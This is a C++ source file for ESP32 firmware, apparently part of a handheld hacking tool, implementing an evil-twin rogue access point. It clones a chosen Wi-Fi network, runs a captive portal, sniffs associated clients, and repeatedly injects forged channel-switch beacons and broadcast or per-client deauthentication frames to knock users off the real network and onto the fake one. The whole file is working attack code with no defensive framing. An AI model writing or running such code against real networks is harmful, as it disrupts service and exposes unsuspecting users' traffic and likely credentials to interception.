/*
 * wifi_honeypot.cpp - Rogue AP / honeypot sub-application.
 *
 * Flow:
 *   MODE    - choose attack style:
 *               BROADCAST — deauth to FF:FF:FF:FF:FF:FF (fast, less targeted)
 *               TARGETED  — sniff clients on target channel first, then send
 *                           directed deauths per client (harder to ignore)
 *   SCAN    - async AP scan
 *   SELECT  - pick one AP to clone (SSID + BSSID + channel)
 *   [SNIFF] - (TARGETED only) listen on target channel for HP_SNIFF_MS to
 *             discover associated clients.  BACK = skip.
 *   RUNNING - clone AP up immediately on our channel; captive portal active.
 *             Every HP_LURE_PERIOD_MS the radio briefly hops to the target's
 *             original channel, injects CSA beacon + deauth(s), then returns.
 *             This continuously drives lingering clients toward us.
 *
 * Channel: honeypot picks from {1,6,11} ≠ target.channel.
 */
#ifdef BS_WIFI_ESP32
#ifdef ARDUINO_ARCH_ESP32

#include "wifi_honeypot.h"

extern "C" {
#include "bs/bs_wifi.h"
#include "bs/bs_gfx.h"
#include "bs/bs_nav.h"
#include "bs/bs_theme.h"
#include "bs/bs_ui.h"
#include "bs/bs_arch.h"
}

#include "esp_wifi.h"

#include <string.h>
#include <stdio.h>
#include <stdarg.h>

#include "wifi_common.h"
#include "wifi_portal.h"

/* ── Config ─────────────────────────────────────────────────────────────── */

#define HP_MAX_APS         32
#define HP_MAX_CLIENTS     16
#define HP_LOG_LINES        5
#define HP_LOG_LEN         48
#define HP_REFRESH_MS    1000

#define HP_SNIFF_MS       8000    /* client discovery window (TARGETED)       */
#define HP_LURE_PERIOD_MS 8000    /* how often to re-inject while AP is up    */
#define HP_LURE_BURST      3      /* CSA + deauth frames per lure injection   */

/* ── Phase / mode ────────────────────────────────────────────────────────── */

typedef enum { HP_MODE, HP_SCAN, HP_SELECT, HP_SNIFF, HP_RUNNING } hp_phase_t;
typedef enum { HP_BROADCAST, HP_TARGETED } hp_attack_t;

/* ── State ───────────────────────────────────────────────────────────────── */

static hp_phase_t   s_phase;
static hp_attack_t  s_attack;
static bs_wifi_ap_t s_aps[HP_MAX_APS];
static int          s_ap_count;
static int          s_cursor;

static char         s_target_ssid[33];
static uint8_t      s_target_bssid[6];
static uint8_t      s_target_ch;
static uint8_t      s_hp_ch;

/* Client list (TARGETED mode) */
static uint8_t      s_clients[HP_MAX_CLIENTS][6];
static int          s_client_count;

/* Sniff timing */
static uint32_t     s_sniff_start_ms;

/* Lure timing (periodic injection while AP is up) */
static uint32_t     s_lure_last_ms;

/* Client join tracking */
static int          s_prev_clients;

static char         s_log[HP_LOG_LINES][HP_LOG_LEN];
static int          s_log_head;
static int          s_log_count;

/* ── Helpers ─────────────────────────────────────────────────────────────── */

static uint8_t pick_hp_channel(uint8_t orig) {
    const uint8_t cands[] = {1, 6, 11};
    for (int i = 0; i < 3; i++)
        if (cands[i] != orig) return cands[i];
    return 1;
}

static void hp_log(const char* fmt, ...) {
    va_list ap;
    va_start(ap, fmt);
    vsnprintf(s_log[s_log_head], HP_LOG_LEN, fmt, ap);
    va_end(ap);
    s_log[s_log_head][HP_LOG_LEN - 1] = '\0';
    s_log_head = (s_log_head + 1) % HP_LOG_LINES;
    if (s_log_count < HP_LOG_LINES) s_log_count++;
}

/* ── Client sniffer callback (TARGETED mode sniff phase) ──────────────────── */

static bool client_known(const uint8_t mac[6]) {
    for (int i = 0; i < s_client_count; i++)
        if (memcmp(s_clients[i], mac, 6) == 0) return true;
    return false;
}

static void sniff_cb(const uint8_t* frame, uint16_t len,
                     int8_t rssi, void* ctx) {
    (void)rssi; (void)ctx;
    if (len < 22) return;
    /* DATA frames: check BSSID (addr3) matches our target, add addr2 as STA */
    if (((frame[0] >> 2) & 0x3) == 2) {
        if (memcmp(frame + 16, s_target_bssid, 6) != 0) return;
        const uint8_t* mac = frame + 10;  /* addr2 = transmitting STA */
        if (client_known(mac)) return;
        if (s_client_count >= HP_MAX_CLIENTS) return;
        memcpy(s_clients[s_client_count++], mac, 6);
    }
}

/* ── Lure injection (brief channel hop while AP is running) ──────────────── */

static int build_csa_beacon(uint8_t* buf, size_t buf_size) {
    int flen = wifi_build_beacon(buf, buf_size,
                                 s_target_ssid, s_target_bssid, s_target_ch);
    if (flen < 0 || flen + 5 > (int)buf_size) return flen;
    buf[flen++] = 0x25;        /* tag: Channel Switch Announcement */
    buf[flen++] = 0x03;
    buf[flen++] = 0x01;        /* mode: STAs stop transmitting     */
    buf[flen++] = s_hp_ch;     /* new channel                      */
    buf[flen++] = 0x01;        /* count: 1 beacon interval         */
    return flen;
}

/*
 * Inject lure frames on the target's original channel.
 * The AP must be stopped before calling — wifi_portal_stop() is called
 * by the caller, and wifi_portal_start() is called after.
 * Total injection time: ~10 ms for HP_LURE_BURST=3 frames.
 */
static void inject_lure(void) {
    uint8_t frame[200];
    static const uint8_t bcast[6] = {0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};

    bs_wifi_monitor_start(s_target_ch, NULL, NULL);

    for (int i = 0; i < HP_LURE_BURST; i++) {
        int flen = build_csa_beacon(frame, sizeof(frame));
        if (flen > 0)
            bs_wifi_send_raw(BS_WIFI_IF_STA, frame, (uint16_t)flen);
    }

    if (s_attack == HP_BROADCAST) {
        for (int i = 0; i < HP_LURE_BURST; i++) {
            int flen = wifi_build_deauth(frame, bcast,
                                         s_target_bssid, s_target_bssid, 7);
            bs_wifi_send_raw(BS_WIFI_IF_STA, frame, (uint16_t)flen);
        }
    } else {
        /* TARGETED: directed deauths in both directions per discovered client */
        for (int ci = 0; ci < s_client_count; ci++) {
            int flen;
            /* AP→STA */
            flen = wifi_build_deauth(frame, s_clients[ci],
                                     s_target_bssid, s_target_bssid, 7);
            bs_wifi_send_raw(BS_WIFI_IF_STA, frame, (uint16_t)flen);
            /* STA→AP */
            flen = wifi_build_deauth(frame, s_target_bssid,
                                     s_clients[ci], s_target_bssid, 7);
            bs_wifi_send_raw(BS_WIFI_IF_STA, frame, (uint16_t)flen);
        }
        /* Plus a broadcast as fallback if no clients were sniffed */
        if (s_client_count == 0) {
            int flen = wifi_build_deauth(frame, bcast,
                                         s_target_bssid, s_target_bssid, 7);
            bs_wifi_send_raw(BS_WIFI_IF_STA, frame, (uint16_t)flen);
        }
    }

    bs_wifi_monitor_stop();
}

/* ── Draw ────────────────────────────────────────────────────────────────── */

static void draw_mode(void) {
    int ts  = bs_ui_text_scale();
    int ts2 = ts > 1 ? ts - 1 : 1;
    int sw  = bs_gfx_width();
    int cy  = bs_ui_content_y();
    int lh  = bs_gfx_text_h(ts) + bs_gfx_text_h(ts2) + 10;

    bs_gfx_clear(g_bs_theme.bg);
    bs_ui_draw_header("Honeypot / Mode");

    const char* names[2]  = { "Broadcast",  "Targeted"   };
    const char* descs[2]  = { "Deauth to FF:FF:FF:FF:FF:FF",
                               "Scan clients, directed deauth" };

    int hint_h  = bs_gfx_text_h(ts2) + 6;
    int visible = (bs_gfx_height() - cy - hint_h) / lh;
    if (visible < 1) visible = 1;

    for (int i = 0; i < 2 && i < visible; i++) {
        bool sel = (i == (int)s_attack);
        int  y   = cy + i * lh;
        if (sel) bs_gfx_fill_rect(0, y - 2, sw, lh - 1, g_bs_theme.dim);
        bs_color_t nc = sel ? g_bs_theme.accent  : g_bs_theme.primary;
        bs_color_t dc = sel ? g_bs_theme.primary : g_bs_theme.dim;
        bs_gfx_text(8, y,                          names[i], nc, ts);
        bs_gfx_text(8, y + bs_gfx_text_h(ts) + 2, descs[i], dc, ts2);
    }

    bs_ui_draw_hint("UP/DN=mode  SELECT=next  BACK=exit");
    bs_gfx_present();
}

static void draw_scan(bool scanning) {
    int ts = bs_ui_text_scale();
    int ts2 = ts > 1 ? ts - 1 : 1;
    int y  = bs_ui_content_y();
    bs_gfx_clear(g_bs_theme.bg);
    bs_ui_draw_header("Honeypot");
    if (scanning) {
        bs_gfx_text(8, y, "Scanning for APs...", g_bs_theme.primary, ts);
        bs_ui_draw_hint("BACK=exit");
    } else {
        char buf[32];
        snprintf(buf, sizeof(buf), "Found %d AP%s",
                 s_ap_count, s_ap_count == 1 ? "" : "s");
        bs_gfx_text(8, y, buf, g_bs_theme.primary, ts);
        bs_ui_draw_hint("SELECT=continue  BACK=exit");
    }
    bs_gfx_present();
}

static void draw_select(void) {
    int ts  = bs_ui_text_scale();
    int ts2 = ts > 1 ? ts - 1 : 1;
    int sw  = bs_gfx_width();
    int cy  = bs_ui_content_y();
    int lh  = bs_gfx_text_h(ts) + bs_gfx_text_h(ts2) + 6;

    bs_gfx_clear(g_bs_theme.bg);
    bs_ui_draw_header("Honeypot / Target");

    int hint_h  = bs_gfx_text_h(ts2) + 6;
    int visible = (bs_gfx_height() - cy - hint_h) / lh;
    if (visible < 1) visible = 1;

    int scroll = s_cursor - visible / 2;
    if (scroll < 0) scroll = 0;
    if (scroll > s_ap_count - visible) scroll = s_ap_count - visible;
    if (scroll < 0) scroll = 0;

    for (int i = 0; i < visible && (scroll + i) < s_ap_count; i++) {
        int idx = scroll + i;
        bool sel = (idx == s_cursor);
        int  y   = cy + i * lh;

        if (sel) bs_gfx_fill_rect(0, y - 2, sw, lh - 1, g_bs_theme.dim);

        bs_color_t nc = sel ? g_bs_theme.accent  : g_bs_theme.primary;
        bs_color_t dc = sel ? g_bs_theme.primary : g_bs_theme.dim;

        const char* ssid = s_aps[idx].ssid[0] ? s_aps[idx].ssid : "(hidden)";
        char info[32];
        snprintf(info, sizeof(info), "ch%-2d  %4d dBm",
                 s_aps[idx].channel, s_aps[idx].rssi);

        bs_gfx_text(8, y,                          ssid, nc, ts);
        bs_gfx_text(8, y + bs_gfx_text_h(ts) + 1, info, dc, ts2);
    }

    bs_ui_draw_hint("SELECT=clone  BACK=rescan");
    bs_gfx_present();
}

static void draw_sniff(uint32_t elapsed) {
    int ts  = bs_ui_text_scale();
    int ts2 = ts > 1 ? ts - 1 : 1;
    int y   = bs_ui_content_y();
    int lh  = bs_gfx_text_h(ts)  + 4;
    int lh2 = bs_gfx_text_h(ts2) + 3;

    bs_gfx_clear(g_bs_theme.bg);
    bs_ui_draw_header("Honeypot / Scanning Clients");

    const char* ssid = s_target_ssid[0] ? s_target_ssid : "(hidden)";
    bs_gfx_text(8, y, ssid, g_bs_theme.accent, ts);
    y += lh;

    char buf[48];
    snprintf(buf, sizeof(buf), "ch%d  — listening for clients", s_target_ch);
    bs_gfx_text(8, y, buf, g_bs_theme.primary, ts2);
    y += lh2 + 6;

    /* Progress bar */
    int bar_h   = bs_gfx_text_h(ts2);
    int total_w = bs_gfx_width() - 16;
    uint32_t cap = elapsed < (uint32_t)HP_SNIFF_MS ? elapsed : HP_SNIFF_MS;
    int fill_w  = (int)((long)total_w * cap / HP_SNIFF_MS);
    bs_gfx_fill_rect(8,       y, total_w, bar_h, g_bs_theme.dim);
    if (fill_w > 0)
        bs_gfx_fill_rect(8,   y, fill_w,  bar_h, g_bs_theme.accent);
    y += bar_h + 6;

    snprintf(buf, sizeof(buf), "%d client(s)  %lu/%d ms",
             s_client_count, (unsigned long)elapsed, HP_SNIFF_MS);
    bs_gfx_text(8, y, buf, g_bs_theme.dim, ts2);

    bs_ui_draw_hint("BACK=skip");
    bs_gfx_present();
}

static void draw_running(uint32_t now) {
    int ts  = bs_ui_text_scale();
    int ts2 = ts > 1 ? ts - 1 : 1;
    int y   = bs_ui_content_y();
    int lh  = bs_gfx_text_h(ts)  + 4;
    int lh2 = bs_gfx_text_h(ts2) + 3;

    bs_gfx_clear(g_bs_theme.bg);
    bs_ui_draw_header("Honeypot");

    char buf[80];
    const char* mode_str = (s_attack == HP_BROADCAST) ? "BCAST" : "TGTD";
    snprintf(buf, sizeof(buf), "AP: %.30s  ch%d  [%s]",
             s_target_ssid[0] ? s_target_ssid : "(hidden)", s_hp_ch, mode_str);
    bs_gfx_text(8, y, buf, g_bs_theme.accent, ts);
    y += lh;

    wifi_sta_list_t sta = {};
    esp_wifi_ap_get_sta_list(&sta);
    snprintf(buf, sizeof(buf), "Clients: %d   IP: 192.168.4.1", sta.num);
    bs_gfx_text(8, y, buf, g_bs_theme.primary, ts2);
    y += lh2;

    /* Next lure countdown */
    uint32_t since_lure = now - s_lure_last_ms;
    uint32_t next_in    = (since_lure < (uint32_t)HP_LURE_PERIOD_MS)
                          ? (HP_LURE_PERIOD_MS - since_lure) / 1000 : 0;
    snprintf(buf, sizeof(buf), "Next lure: %lus", (unsigned long)next_in);
    bs_gfx_text(8, y, buf, g_bs_theme.dim, ts2);
    y += lh2 + 4;

    bs_gfx_fill_rect(4, y, bs_gfx_width() - 8, 1, g_bs_theme.dim);
    y += 5;

    for (int i = 0; i < s_log_count && i < HP_LOG_LINES; i++) {
        int idx = (s_log_head - s_log_count + i + HP_LOG_LINES * 2) % HP_LOG_LINES;
        bs_color_t c = (i == s_log_count - 1) ? g_bs_theme.accent : g_bs_theme.dim;
        /* Clamp to hint line */
        int line_y = y + i * lh2;
        if (line_y + lh2 > bs_gfx_height() - bs_gfx_text_h(ts2) - 6) break;
        bs_gfx_text(8, line_y, s_log[idx], c, ts2);
    }

    bs_ui_draw_hint("BACK=stop");
    bs_gfx_present();
}

/* ── Main entry ──────────────────────────────────────────────────────────── */

extern "C" void wifi_honeypot_run(const bs_arch_t* arch) {
    s_phase        = HP_MODE;
    s_attack       = HP_BROADCAST;
    s_ap_count     = 0;
    s_cursor       = 0;
    s_client_count = 0;
    s_lure_last_ms = 0;
    s_prev_clients = 0;
    s_log_head     = 0;
    s_log_count    = 0;

    bool dirty     = true;
    bool scanning  = false;
    uint32_t last_refresh = 0;

    for (;;) {
        uint32_t now = arch->millis();

        /* ── Portal service (RUNNING) ───────────────────────────────────── */
        if (s_phase == HP_RUNNING && wifi_portal_active()) {
            wifi_portal_poll();

            wifi_sta_list_t sta = {};
            esp_wifi_ap_get_sta_list(&sta);
            if (sta.num > s_prev_clients) {
                for (int i = s_prev_clients; i < (int)sta.num; i++) {
                    hp_log("Client %02X:%02X:%02X:.. joined",
                           sta.sta[i].mac[0],
                           sta.sta[i].mac[1],
                           sta.sta[i].mac[2]);
                }
            } else if (sta.num < s_prev_clients) {
                hp_log("Client disconnected");
            }
            s_prev_clients = sta.num;

            /* Periodic lure injection */
            if (s_lure_last_ms == 0) s_lure_last_ms = now;
            if ((now - s_lure_last_ms) >= (uint32_t)HP_LURE_PERIOD_MS) {
                s_lure_last_ms = now;
                hp_log("Injecting lure on ch%d...", s_target_ch);
                /* Brief AP pause to inject on target channel */
                wifi_portal_stop();
                inject_lure();
                wifi_portal_start(s_target_ssid, s_hp_ch);
                hp_log("Lure done, AP back on ch%d", s_hp_ch);
                dirty = true;
            }
        }

        /* ── Scan poll ──────────────────────────────────────────────────── */
        if (s_phase == HP_SCAN && scanning && bs_wifi_scan_done()) {
            s_ap_count = bs_wifi_scan_results(s_aps, HP_MAX_APS);
            if (s_ap_count < 0) s_ap_count = 0;
            scanning = false;
            dirty = true;
        }

        /* ── Sniff tick ─────────────────────────────────────────────────── */
        if (s_phase == HP_SNIFF) {
            if (s_sniff_start_ms == 0) s_sniff_start_ms = now;
            uint32_t elapsed = now - s_sniff_start_ms;
            if ((elapsed % 500) < 5) dirty = true;  /* refresh bar */

            if (elapsed >= (uint32_t)HP_SNIFF_MS) {
                bs_wifi_monitor_stop();
                hp_log("Found %d client(s)", s_client_count);
                /* Start AP and enter RUNNING */
                if (wifi_portal_start(s_target_ssid, s_hp_ch)) {
                    hp_log("AP up ch%d  IP: 192.168.4.1", s_hp_ch);
                    s_lure_last_ms = now;
                    s_phase        = HP_RUNNING;
                    last_refresh   = now;
                } else {
                    hp_log("AP start FAILED");
                    s_phase = HP_SELECT;
                }
                dirty = true;
            }
        }

        /* ── Input ──────────────────────────────────────────────────────── */
        bs_nav_id_t nav;
        while ((nav = bs_nav_poll()) != BS_NAV_NONE) {
            switch (s_phase) {

            case HP_MODE:
                if (nav == BS_NAV_BACK) return;
                if (nav == BS_NAV_UP || nav == BS_NAV_PREV) {
                    s_attack = HP_BROADCAST; dirty = true;
                } else if (nav == BS_NAV_DOWN || nav == BS_NAV_NEXT) {
                    s_attack = HP_TARGETED; dirty = true;
                } else if (nav == BS_NAV_SELECT) {
                    s_phase   = HP_SCAN;
                    s_ap_count = 0;
                    scanning  = true;
                    bs_wifi_scan_start();
                    hp_log("Scanning...");
                    dirty = true;
                }
                break;

            case HP_SCAN:
                if (nav == BS_NAV_BACK) { wifi_portal_stop(); return; }
                if (nav == BS_NAV_SELECT && !scanning) {
                    if (s_ap_count == 0) {
                        scanning = true;
                        bs_wifi_scan_start();
                        hp_log("Rescanning...");
                    } else {
                        s_phase  = HP_SELECT;
                        s_cursor = 0;
                    }
                    dirty = true;
                }
                break;

            case HP_SELECT:
                if (nav == BS_NAV_UP || nav == BS_NAV_PREV) {
                    if (s_cursor > 0) { s_cursor--; dirty = true; }
                } else if (nav == BS_NAV_DOWN || nav == BS_NAV_NEXT) {
                    if (s_cursor < s_ap_count - 1) { s_cursor++; dirty = true; }
                } else if (nav == BS_NAV_SELECT) {
                    strncpy(s_target_ssid, s_aps[s_cursor].ssid, 32);
                    s_target_ssid[32] = '\0';
                    memcpy(s_target_bssid, s_aps[s_cursor].bssid, 6);
                    s_target_ch = s_aps[s_cursor].channel;
                    s_hp_ch     = pick_hp_channel(s_target_ch);
                    s_client_count = 0;

                    hp_log("Target: %.24s ch%d -> ch%d",
                           s_target_ssid[0] ? s_target_ssid : "(hidden)",
                           s_target_ch, s_hp_ch);

                    if (s_attack == HP_TARGETED) {
                        /* Sniff clients before starting AP */
                        bs_wifi_monitor_start(s_target_ch, sniff_cb, NULL);
                        s_sniff_start_ms = 0;
                        s_phase = HP_SNIFF;
                    } else {
                        /* Broadcast: start AP immediately */
                        if (wifi_portal_start(s_target_ssid, s_hp_ch)) {
                            hp_log("AP up ch%d  IP: 192.168.4.1", s_hp_ch);
                            s_lure_last_ms = now;
                            s_phase        = HP_RUNNING;
                            last_refresh   = now;
                        } else {
                            hp_log("AP start FAILED");
                        }
                    }
                    dirty = true;
                } else if (nav == BS_NAV_BACK) {
                    s_phase    = HP_SCAN;
                    s_ap_count = 0;
                    scanning   = true;
                    bs_wifi_scan_start();
                    hp_log("Rescanning...");
                    dirty = true;
                }
                break;

            case HP_SNIFF:
                if (nav == BS_NAV_BACK) {
                    /* Skip remaining sniff, start AP now */
                    bs_wifi_monitor_stop();
                    hp_log("Sniff skipped, %d client(s)", s_client_count);
                    if (wifi_portal_start(s_target_ssid, s_hp_ch)) {
                        hp_log("AP up ch%d  IP: 192.168.4.1", s_hp_ch);
                        s_lure_last_ms = now;
                        s_phase        = HP_RUNNING;
                        last_refresh   = now;
                    } else {
                        hp_log("AP start FAILED");
                        s_phase = HP_SELECT;
                    }
                    dirty = true;
                }
                break;

            case HP_RUNNING:
                if (nav == BS_NAV_BACK) {
                    hp_log("Portal stopped.");
                    wifi_portal_stop();
                    return;
                }
                break;
            }
        }

        /* ── Draw ───────────────────────────────────────────────────────── */
        if (dirty) {
            dirty = false;
            uint32_t elapsed = (s_phase == HP_SNIFF && s_sniff_start_ms)
                               ? (now - s_sniff_start_ms) : 0;
            switch (s_phase) {
            case HP_MODE:    draw_mode();          break;
            case HP_SCAN:    draw_scan(scanning);  break;
            case HP_SELECT:  draw_select();        break;
            case HP_SNIFF:   draw_sniff(elapsed);  break;
            case HP_RUNNING: draw_running(now);    break;
            }
        }

        if (s_phase == HP_RUNNING && (now - last_refresh) >= (uint32_t)HP_REFRESH_MS) {
            last_refresh = now;
            draw_running(now);
        }

        arch->delay_ms(s_phase == HP_RUNNING ? 10 : 5);
    }
}

#endif /* ARDUINO_ARCH_ESP32 */
#endif /* BS_WIFI_ESP32 */
